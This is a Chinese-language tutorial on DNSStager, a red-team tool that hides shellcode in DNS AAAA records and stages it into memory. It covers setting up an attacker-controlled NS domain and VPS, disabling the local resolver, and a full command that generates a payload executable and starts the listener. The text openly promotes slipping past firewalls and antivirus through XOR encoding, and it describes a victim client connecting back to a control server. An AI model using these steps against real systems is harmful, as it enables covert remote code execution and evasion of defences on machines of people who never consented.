### DNSStager 介绍

DNSStager 是一种工具，旨在帮助红队人员通过 DNS 隐藏并加载多段 shellcode。其工作原理与分离式 shellcode 免杀技术类似，但采用了更隐蔽的方法：将 shellcode 分割成多个部分，并通过多次 DNS 查询请求来逐步加载这些片段。最终目标是执行完整的 shellcode 并实现上线。

**核心机制**：
- 用户首先设置一个根域名（例如 `gendns.tk`）作为 NS 服务器。
- 然后配置该服务器以提供特定子域名（如 `test.gendns.tk`）的解析服务。
- 接着，在本地为这个子域名创建多个 AAAA 记录，每个记录包含一部分 shellcode 的 IPv6 地址。
- 工具会循环请求这些记录，并将返回的数据拼接起来形成完整的 shellcode。
- 最后，加密后的 shellcode 被解码并在内存中执行。

**优点**：
1. 加载过程表现为正常的 DNS 请求，因此不容易被防火墙拦截。
2. 使用 XOR 加密等技术对 shellcode 进行编码，有助于绕过一些反病毒软件的检测。

### DNSStager 使用条件

要开始使用 DNSStager，请遵循以下步骤：

1. 从官方仓库克隆项目：
   ```bash
   git clone <官方仓库地址>
   ```

2. 安装 Python 依赖项：
   ```bash
   pip3 install -r requirements.txt
   ```

3. 停止和禁用系统自带的 DNS 解析服务（对于 Ubuntu/Kali 系统）：
   ```bash
   sudo service systemd-resolved stop
   sudo systemctl disable systemd-resolved
   ```

4. 如果选择 C 或 Go 语言版本，则需额外安装相应编译器及相关库文件。对于 Golang 版本，推荐至少 v1.16.3，并且需要以下两个第三方包：
   - `golang.org/x/sys`
   - `github.com/miekg/dns`

### 域名配置

为了使 DNSStager 正常工作，您必须拥有一个可自定义 NS 记录的域名。通常可以从像 Freenom 这样的免费提供商处获取，或者购买商业域名。接着，在第三方 DNS 服务提供商（如 Dnspod、Cloudflare）上设置您的域名，将其 NS 记录指向自己的 VPS 服务器。确保 VPS 对外开放了 UDP 端口 53 用于处理 DNS 查询。

### 使用方法示例

假设已经完成了上述所有准备工作，现在可以生成特定类型的 payload 并启动监听服务了。下面是一个基于 x64 架构及 IPv6 地址编码的例子：
```bash
dnsstager.py --domain test.gendns.tk --payload x64/c/ipv6 --output /home/a.exe --prefix cloud-srv- --shellcode_path /home/DNSStager/payload.bin --sleep 1 --xorkey 0x10
```
此命令指定了输出文件路径、前缀名称以及其他必要参数。运行后，程序会在指定位置生成可执行文件，并开始监听来自客户端的 DNS 请求。

更多关于不同类型 payload 的信息可以通过 `python3 dnsstager.py --payloads` 获取。

### 测试与验证

- 在启动 DNSStager 后，可以使用 `dig` 工具检查是否正确设置了 NS 子域名。
- 成功添加 AAAA 记录后，再次运行 `dig` 应能看到预期结果。
- 根据提示，整个过程可能涉及多次 DNS 查询才能完整下载 shellcode。
- 可以利用 Wireshark 监控网络流量，确认 DNS 请求是否按计划进行。
- 最终，如果一切顺利，应该能够看到客户端成功连接到控制端。